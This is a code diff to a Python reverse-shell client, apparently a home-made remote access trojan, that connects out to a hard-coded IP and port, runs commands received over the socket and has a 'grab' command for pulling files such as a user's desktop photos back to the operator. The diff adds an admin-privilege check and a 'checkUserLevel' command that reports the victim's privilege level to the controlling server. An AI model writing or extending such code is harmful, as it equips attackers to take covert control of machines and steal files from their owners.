@@ -8,6 +8,7 @@ import socket
 import subprocess
 import os
 import time
+import ctypes
 
 ip = "172.25.191.60"
 port = 8080
@@ -54,6 +55,15 @@ def letSend(mySocket, path, fileName):
                 break
             f.write(bits)
 
+# https://borutzki.github.io/2025/10/16/how-to-check-whether-python-script-has-elevated-privileges.html
+def is_admin() -> bool:
+    if os.name == "nt":
+        return ctypes.windll.shell32.IsUserAnAdmin() != 0
+    elif os.name == "posix":
+        return os.getuid() == 0
+    else:
+        return False
+
 def shell(mySocket):
     while True:
         command = mySocket.recv(5000)
@@ -66,6 +76,17 @@ def shell(mySocket):
                 informToServer = "[+] Some error occured. " + str(e)
                 mySocket.send(informToServer.encode())
                 break
+
+        elif 'checkUserLevel' in command.decode():
+            try:
+                if is_admin():
+                    informToServer = '[!] Administrator Privileges'
+                else:
+                    informToServer = '[!!] User Privileges. (No Admin privileges)'
+                mySocket.send(informToServer.encode())
+            except Exception as e:
+                informToServer = "[+] Some error occured. " + str(e)
+                mySocket.send(informToServer.encode())
 
         # command format: grab*,file Path>
         # example: grab*C:\Users\John\Desktop\photo.jpeg
